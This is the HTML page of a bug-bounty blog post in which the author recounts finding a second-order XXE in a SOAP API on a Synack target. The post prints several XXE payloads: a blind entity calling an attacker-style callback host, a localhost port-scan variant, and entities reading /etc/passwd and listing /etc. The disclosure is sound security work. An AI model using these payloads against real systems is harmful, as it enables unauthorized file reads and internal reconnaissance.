@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>XXE :: kuldeepdotexe&#39;s blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="A writeup about my finding on Synack that was an XXE that allowed me to read local files stored on the web server." />
+<meta name="keywords" content="XXE, LFI, XML External Entities, Local File Read, Second Order XXE" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://kuldeep.io/posts/xxe/" />
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-8LMH0XXR2S"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-8LMH0XXR2S', { 'anonymize_ip': false });
+}
+</script>
+
+
+
+<link rel="stylesheet" href="https://kuldeep.io/assets/style.css">
+
+  <link rel="stylesheet" href="https://kuldeep.io/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="https://kuldeep.io/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://kuldeep.io/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="kuldeepdotexe" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="XXE">
+<meta property="og:description" content="A writeup about my finding on Synack that was an XXE that allowed me to read local files stored on the web server." />
+<meta property="og:url" content="https://kuldeep.io/posts/xxe/" />
+<meta property="og:site_name" content="kuldeepdotexe&#39;s blog" />
+
+  <meta property="og:image" content="https://kuldeep.io/">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2022-10-19 17:59:25 &#43;0530 IST" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-8LMH0XXR2S"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-8LMH0XXR2S', { 'anonymize_ip': false });
+}
+</script>
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Kuldeep&#39;s Blog
+  </div>
+</a>
+
+    </div>
+    
+  </div>
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://kuldeep.io/posts/xxe/">XXE</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2022-10-19
+        
+      </span>
+    
+    
+      <span class="post-author">:: Kuldeep Pandya</span>
+    
+    
+      <span class="post-reading-time">:: 4 min read (720 words)</span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://kuldeep.io/tags/xxe/">XXE</a>&nbsp;
+    
+    #<a href="https://kuldeep.io/tags/lfi/">LFI</a>&nbsp;
+    
+  </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>Hello, guys!</p>
+<p>This writeup is about my recent discovery on Synack Red Team which was a Second Order XXE that allowed me to read files stored on the web server.</p>
+<p>Please note that this article is not about how/why/when of the XXE attacks. This is just a single case of XXE that I found and I wish to elaborate. If you want to learn more about XXEs, you may refer to the following links:</p>
+<ul>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity">HackTricks XXE</a></li>
+<li><a href="https://portswigger.net/web-security/xxe">Portswigger XXE</a></li>
+</ul>
+<p>Now to the blog.</p>
+<p>A fresh target was onboarded in the morning and I hopped onto it as soon as I received the email. In the scope, there were two web applications listed along with two postman collections. I prefer postman collections over web apps so I loaded the collections with their environments into my postman.</p>
+<p>After sending the very first request, I noticed that the application was using SOAP API to transfer the data. I tried to perform XXE in the SOAP body itself but the application threw an error saying &ldquo;<strong>DOCTYPE is not allowed</strong>&rdquo;.</p>
+<p><img src="/DOCTYPENotAllowed.png" alt="DOCTYPENotAllowed"></p>
+<p>Here, we cannot perform XXE as <code>DOCTYPE</code> is explicitly blocked.</p>
+<p>Upon checking all the modules one by one, I came across a module named <code>NormalTextRepository</code> which had the following two requests:</p>
+<ul>
+<li><code>saveNormalText</code></li>
+<li><code>GetNamedNormalText</code></li>
+</ul>
+<p><img src="/NormalTextRepository.png" alt="NormalTextRepository"></p>
+<p>After sending the first <code>saveNormalText</code> request and intercepting it in Burp Suite, I found out that it contained some HTML-encoded data that looked like this:</p>
+<p><img src="/HTMLEncodedData.png" alt="HTMLEncodedData"></p>
+<p>Upon decoding, the data looked like this:</p>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;normal xmlns=&#34;urn:hl7-org:v3&#34; xmlns:XX=&#34;http://REDACTED.com/REDACTED&#34;&gt;&lt;content XX:status=&#34;normal&#34; XX:state=&#34;normal&#34;&gt;Synacktest&lt;/content&gt;&lt;/normal&gt;
+</code></pre><p>This quickly brought my attention. This was XML data being passed inside the XML body in a SOAP request (Inception vibes).</p>
+<p>I went on to try XXE here as well. For this, I copy pasted a simple Blind XXE payload from <a href="https://portswigger.net/web-security/xxe/blind">PortSwigger</a>:</p>
+<pre tabindex="0"><code>&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM &#34;http://f2g9j7hhkax.web-attacker.com/XXETEST&#34;&gt; %xxe; ]&gt;
+</code></pre><p>I used Synack&rsquo;s provided web server to test for this. Upon checking its logs, I found out that there indeed was a hit for the <code>/XXETEST</code> endpoint.</p>
+<p><img src="/TUPoCHit.png" alt="TUPoCHit"></p>
+<p>This still was a blind XXE and I had to turn it into a full XXE in order to receive a full payout. I tried different file read payloads from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection">PayloadsAllTheThings</a> and <a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity">HackTricks</a> but they did not seem to work in my case.</p>
+<p>In my case, the XXE was not reflected anywhere in the response. This is why it was comparatively difficult to exploit.</p>
+<p>After poking for a while, I gave up with the idea of full XXE and went ahead to check if port scan was possible or not as we were able to send HTTP requests.</p>
+<p>I sent the request to Burp Suite&rsquo;s intruder and fuzzed for the ports from 1 to 1000. The payload for that looked like the following:</p>
+<pre tabindex="0"><code>&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM &#34;http://127.0.0.1:§1§/XXETEST&#34;&gt; %xxe; ]&gt;
+</code></pre><p>However, the result of the intruder was just not making any sense to me. All the ports that I fuzzed were throwing random time delays.</p>
+<p><img src="/IntruderPortScan.png" alt="IntruderPortScan"></p>
+<p>Again, lost all hope and was about to give up on this XXE once again. Then a thought struck my head. &ldquo;If this data is being saved in the application, there should be some way to retrieve it also&rdquo;. I checked the other <code>GetNamedNormalText</code> request in this module and immediately felt stupid. This request retrieved the data that we saved from the first <code>saveNormalText</code> request.</p>
+<p>I used the following XXE file read payload and saved the data:</p>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY example SYSTEM &#34;/etc/passwd&#34;&gt; ]&gt;
+</code></pre><p>Then sent the second <code>GetNamedNormalText</code> request to retrieve the saved data. And in the response, I could see the contents of the <code>/etc/passwd</code> file!</p>
+<p><img src="/EtcPasswd.png" alt="/etc/passwd"></p>
+<p>This was enough for a proof of concept. However, looking at the <strong>JSESSIONCOOKIE</strong>, I could tell that the application was built using Java. And, in Java applications, if you just provide a directory instead of a file, it will list down the contents of that directory and return it.</p>
+<p>For this purpose, I just removed the <code>/passwd</code> portion from the above file read payload. The updated payload looked like this:</p>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY example SYSTEM &#34;/etc&#34;&gt; ]&gt;
+</code></pre><p>Upon saving the above payload and retrieving it using the second request, we could see the directory listing of the <code>/etc</code> directory!</p>
+<p><img src="/EtcDirectoryList.png" alt="/etc Directory Listing"></p>
+<p>Sent it to Synack and they happily triaged it within approximately 2 hours.</p>
+<p>Thank you for reading. :)</p>
+<p>You can reach out to me at <a href="https://twitter.com/kuldeepdotexe">@kuldeepdotexe</a>.</p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="https://kuldeep.io/posts/nosql-injection-in-plain-sight/">
+                <span class="button__text">NoSQL Injection in Plain Sight</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://kuldeep.io/assets/main.js"></script>
+<script src="https://kuldeep.io/assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
